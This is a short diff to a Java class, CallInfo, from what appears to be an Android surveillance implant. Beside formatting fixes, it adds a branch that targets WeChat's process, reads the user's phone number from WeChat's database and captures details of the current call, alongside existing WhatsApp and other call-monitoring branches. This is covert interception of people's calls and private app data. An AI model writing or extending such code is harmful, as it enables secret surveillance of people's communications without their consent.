@@ -172,7 +172,7 @@ public class CallInfo {
 				this.account = account;
 				*/
 				this.account = "my account";
-					ret = ChatLine.getCurrentCall(this);
+				ret = ChatLine.getCurrentCall(this);
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateCallInfo) id: " + this.id);
@@ -218,7 +218,7 @@ public class CallInfo {
 
 			return ret;
 
-		}else if (this.programId == 0x014b) {
+		} else if (this.programId == 0x014b) {
 			if (end) {
 				return true;
 			}
@@ -238,8 +238,32 @@ public class CallInfo {
 			boolean ret = false;
 				ret = ChatWhatsapp.getCurrentCall(this);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+					Check.log(TAG + " WHATSAPP (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
 				}
+
+			return ret;
+		}else if (this.programId == 0x0149) {
+			if (end) {
+				return true;
+			}
+			this.processName = M.e("com.tencent.mm");
+			// open DB
+			String account = ChatWeChat.readMyPhoneNumber();
+			this.account = account;
+			this.delay = false;
+			this.realRate = true;
+
+			if(account == null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (update) ERROR, cannot read wechat account ");
+					return false;
+				}
+			}
+			boolean ret = false;
+			ret = ChatWeChat.getCurrentCall(this);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
 
 			return ret;
 		}else if (this.programId == 0x014c) {
